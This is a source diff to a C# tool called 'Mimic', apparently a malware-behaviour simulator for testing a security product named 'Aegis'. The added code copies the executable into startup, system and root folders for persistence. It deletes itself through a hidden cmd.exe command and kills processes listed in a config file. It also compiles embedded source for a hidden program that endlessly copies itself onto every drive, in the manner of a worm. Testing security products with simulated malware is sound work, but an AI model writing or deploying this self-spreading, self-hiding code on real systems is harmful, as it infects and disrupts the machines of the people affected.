@@ -12,20 +12,88 @@ using System.Threading;
 using System.Reflection;
 using System.Collections;
 
+
 namespace Mimic
 {
     class Program
     {
         static void Main(string[] args)
-        {
+        {       
             callFunctionInOrder();
             Console.WriteLine("\nPress ENTER to exit.");
             Console.ReadLine();            
         }
-        //Functions needed in Aegis
+        #region Functions needed in Aegis
+        private static void TerminateProcess(IniFile config)
+        {
+            Console.WriteLine("======= Terminate Process =======");
+            string[] processName = config.IniReadValue("API", "terminateProc").Split(';');
+            foreach (string proc in processName)
+            {
+                try
+                {                    
+                    Process[] hProcess = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(changeToken(proc)));
+                    if (hProcess.Length != 0)
+                    {
+                        foreach (Process hProc in hProcess)
+                        {
+                            if (String.Equals(hProc.MainModule.FileName, changeToken(proc), StringComparison.OrdinalIgnoreCase))
+                            {
+                                hProc.Kill();
+                                Console.WriteLine("[+] {0} Terminated", Path.GetFileName(changeToken(proc)));
+                            }
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("[-] {0} runnning process not found.", changeToken(proc));
+                    }
+                }
+                catch(Exception e)
+                {
+                    Console.WriteLine("[-] Error: {0}", e.Message);
+                }
+            }
+        }
+        private static void MimicBehaviour(IniFile config)
+        {
+            Console.WriteLine("======= Mimic Behaviour =======");
+            if (GetConfigVal("Mimic", "SelfPropagate", config))
+            {               
+                string fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe"),
+                    filePath = Path.Combine(Environment.CurrentDirectory, fileName);
+                string[] destPath = { @"$mytemp$\", @"$mystartup$\", @"$systemdir$\", @"$rootdir$\" };
+
+                foreach( string dest in destPath)
+                {
+                    File.Copy(filePath, Path.Combine(changeToken(dest), fileName), true);
+                    Console.WriteLine("[+] Self Propagate: " + Path.Combine(changeToken(dest), fileName));
+                }
+            }
+            if (GetConfigVal("Mimic", "SelfClean", config))
+            {
+                string fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe"),
+                                            filePath = Path.Combine(Environment.CurrentDirectory, fileName);
+                try
+                {
+                    Process.Start(new ProcessStartInfo()
+                    {
+                        Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + filePath + "\"",
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true,
+                        FileName = "cmd.exe"
+                    });
+                    Console.WriteLine("[+] Self Destruct :P");
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e.Message);
+                }
+            }
+        }
         private static void ZwWriteVirtualMemory(IniFile config)
         {
-            bool isWriteVM = GetConfigVal("API", "isWriteVirtualMemory", config);
+            bool isWriteVM = GetConfigVal("API", "WriteVirtualMemory", config);
             string[] targetProc = config.IniReadValue("API", "targetProcess").Split(';'),
                 isCreateThread = config.IniReadValue("API", "isCreateThread").Split(';');
             if (isWriteVM)
@@ -280,18 +348,55 @@ namespace Mimic
         private static void CreateFile(IniFile config)
         {
             string exeTest = @"using System;
+                            using System.Collections.Generic;
+                            using System.Text;
+                            using System.Configuration;
+                            using System.IO;
+                            using Microsoft.Win32;
+                            using System.Diagnostics;
+                            using System.Runtime.InteropServices;
+                            using System.Threading;
+                            using System.Reflection;
+                            using System.Collections;
                 namespace Test
                 {
                     class Program
                     {
+                        [DllImport(""kernel32.dll"")]
+                        static extern IntPtr GetConsoleWindow();
+                        [DllImport(""user32.dll"")]
+                        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+                        const int SW_HIDE = 0;
+                        const int SW_SHOW = 5;
                         static void Main(string[] args)
-                        {
-                            Console.WriteLine(""Gwapo ko!"");
-                            Console.ReadLine();
+                        {   
+                            var handle = GetConsoleWindow();
+                            ShowWindow(handle, SW_HIDE);
+                            string fileName = String.Concat(Process.GetCurrentProcess().ProcessName, "".exe""),
+                                            filePath = Path.Combine(Environment.CurrentDirectory, fileName);
+                            while (true)
+                            {
+                                try
+                                {
+                                    DriveInfo[] myDrives = DriveInfo.GetDrives();
+                                    foreach (DriveInfo drive in myDrives)
+                                    {
+                                        if(!File.Exists(Path.Combine(drive.Name, fileName)))
+                                        {
+                                            File.Copy(filePath, Path.Combine(drive.Name, fileName), true);
+                                        }
+                                    }
+                                }
+                                catch (Exception)
+                                {
+                                    throw;
+                                }
+                            }    
                         }
                     }
                 }";
-            bool CreateFile = GetConfigVal("File", "isCreateFile", config);
+            bool CreateFile = GetConfigVal("File", "CreateFile", config);
             string[] fileName = config.IniReadValue("File", "CrFileName").Split(';'),
                      WinStyle = config.IniReadValue("File", "CrFileWindowStyle").Split(';'),
                      fileType = config.IniReadValue("File", "FileType").Split(';');
@@ -312,7 +417,7 @@ namespace Mimic
                         p.GenerateExecutable = true;
                         p.OutputAssembly = @".\temp\temp";
                         p.CompilerOptions = "/t:" + fileType[i];
-
+                        p.ReferencedAssemblies.Add("system.dll");
                         CompilerResults results = codeProvider.CompileAssemblyFromSource(p, exeTest);
                         if (results.Errors.Count > 0)
                         {
@@ -386,7 +491,7 @@ namespace Mimic
         }
         private static void DeleteRegistryVal(IniFile config)
         {            
-            bool delRegVal = GetConfigVal("Registry", "isDeleteRegVal", config);
+            bool delRegVal = GetConfigVal("Registry", "DeleteRegVal", config);
             string[] RegNode = config.IniReadValue("Registry", "DelRegNode").Split(';'),
                 RegKey = config.IniReadValue("Registry", "DelRegKey").Split(';'),
                 RegVal = config.IniReadValue("Registry", "DelRegVal").Split(';');
@@ -421,7 +526,7 @@ namespace Mimic
         }
         private static void DeleteRegistryKey(IniFile config)
         {            
-            bool DelRegKey = GetConfigVal("Registry", "isDeleteRegKey", config);
+            bool DelRegKey = GetConfigVal("Registry", "DeleteRegKey", config);
             string[] RegNode = config.IniReadValue("Registry", "NodRegNode").Split(';'),
                     RegPath = config.IniReadValue("Registry", "NodRegKey").Split(';'),
                     RegKey = config.IniReadValue("Registry", "DelKey").Split(';');
@@ -465,7 +570,7 @@ namespace Mimic
         }
         private static void WriteRegistry(IniFile config)
         {
-            bool WriteReg = GetConfigVal("Registry", "isWriteReg", config); ;
+            bool WriteReg = GetConfigVal("Registry", "WriteReg", config); ;
             string[] RegName = config.IniReadValue("Registry", "WrRegName").Split(';'),
                    RegValue = config.IniReadValue("Registry", "WrRegValue").Split(';'),
                    RegPath = config.IniReadValue("Registry", "WrRegPath").Split(';'),
@@ -543,7 +648,8 @@ namespace Mimic
                     Console.WriteLine("Missing Parameter!");
             }
         }
-        //Optimization Function
+        #endregion
+        #region Optimization Function
         private static RegistryValueKind GetRegType(string typeStr)
         {
             
@@ -653,6 +759,8 @@ namespace Mimic
                 str = str.Replace(strToken[x], varToken[x]);
             return str;
         }
+        #endregion
+        #region order of function
         private static void callFunctionInOrder()
         {
             string curDir = Directory.GetCurrentDirectory();
@@ -660,10 +768,10 @@ namespace Mimic
             var dict = new Dictionary<int, Action>();
             var func = new List<KeyValuePair<int, Action>>()
             {
-                new KeyValuePair<int, Action>(GetConfigValint("Registry", "isWriteReg", config), () => WriteRegistry(config)),
-                new KeyValuePair<int, Action>(GetConfigValint("Registry", "isDeleteRegKey", config), () => DeleteRegistryKey(config)),
-                new KeyValuePair<int, Action>(GetConfigValint("Registry", "isDeleteRegVal", config), () => DeleteRegistryVal(config)),
-                new KeyValuePair<int, Action>(GetConfigValint("File", "isCreateFile", config), () => CreateFile(config)),
+                new KeyValuePair<int, Action>(GetConfigValint("Registry", "WriteReg", config), () => WriteRegistry(config)),
+                new KeyValuePair<int, Action>(GetConfigValint("Registry", "DeleteRegKey", config), () => DeleteRegistryKey(config)),
+                new KeyValuePair<int, Action>(GetConfigValint("Registry", "DeleteRegVal", config), () => DeleteRegistryVal(config)),
+                new KeyValuePair<int, Action>(GetConfigValint("File", "CreateFile", config), () => CreateFile(config)),
                 new KeyValuePair<int, Action>(GetConfigValint("File", "WriteFile", config), () => WriteFile(config)),
                 new KeyValuePair<int, Action>(GetConfigValint("File", "RenFile", config), () => RenFile(config)),
                 new KeyValuePair<int, Action>(GetConfigValint("File", "DelFile", config), () => DelFile(config)),
@@ -671,7 +779,8 @@ namespace Mimic
                 new KeyValuePair<int, Action>(GetConfigValint("API", "CreateMutex", config), () => CreateMutex(config)),
                 new KeyValuePair<int, Action>(GetConfigValint("API", "CreateService", config), () => CreateService(config)),
                 new KeyValuePair<int, Action>(GetConfigValint("API", "CreateProcwithCMDLine", config), () => CreateProcWCmdline(config)),
-                new KeyValuePair<int, Action>(GetConfigValint("API", "isWriteVirtualMemory", config), () => ZwWriteVirtualMemory(config)),
+                new KeyValuePair<int, Action>(GetConfigValint("API", "WriteVirtualMemory", config), () => ZwWriteVirtualMemory(config)),
+                new KeyValuePair<int, Action>(GetConfigValint("API", "TerminateProcess", config), () => TerminateProcess(config))
             };
             foreach (var item in func)
             {
@@ -692,7 +801,10 @@ namespace Mimic
                     dict[i]();
                 }
             }
+            MimicBehaviour(config);
 
         }
+        #endregion
     }
 }
+ 
